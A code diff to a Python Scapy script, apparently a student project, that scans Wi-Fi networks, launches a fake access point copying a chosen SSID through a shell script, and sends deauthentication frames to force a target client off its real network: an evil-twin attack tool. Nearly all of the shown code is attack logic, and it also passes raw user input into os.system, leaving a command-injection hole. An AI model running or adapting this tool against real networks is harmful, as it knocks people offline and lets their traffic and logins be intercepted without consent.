@@ -83,8 +83,8 @@ def deauth_target(target_mac, twin_mac):
 
 
 if __name__ == "__main__":
-    # interface name, check using iwconfig
-    conf.iface = "wlxc83a35c2e0bb"
+    conf.iface = os.getenv("ATTACK_INTERFACE")
+
     # start the thread that prints all the networks
     printer = Thread(target=print_APs)
     printer.daemon = True
@@ -97,9 +97,15 @@ if __name__ == "__main__":
     sniff(prn=callback, monitor=True, timeout=10)
     isSniffing = False
 
-    # bssid_to_scan = networks[networks["SSID"] == "Ariel-University-2.4"].index[0]
-    print("Enter mac address of AP to sacn")
-    bssid_to_scan = input()
+    print("Enter ssid address of AP to sacn")
+
+    ssid_to_scan = input()
+    bssid_to_scan = networks[networks["SSID"] == ssid_to_scan].index[0]
+
+
+    fake_ap = input("please insert a wifi interface name for the fake AP: ")
+    net_ap = input("please insert a wifi interface name with working net connection: ")
+    os.system(f"./rerouting_magic.sh --ap {fake_ap} --net {net_ap} --ssid {ssid_to_scan}")
 
     print(f'Start scanning clients on {bssid_to_scan}')
     sniff(prn=get_AP_clients, monitor=True, stop_filter=lambda x: len(clients) > 0, timeout=120)
@@ -108,5 +114,4 @@ if __name__ == "__main__":
 
     target_mac = input("Enter target mac: ")
     deauth_target(target_mac, bssid_to_scan)
-
     pdb.set_trace()
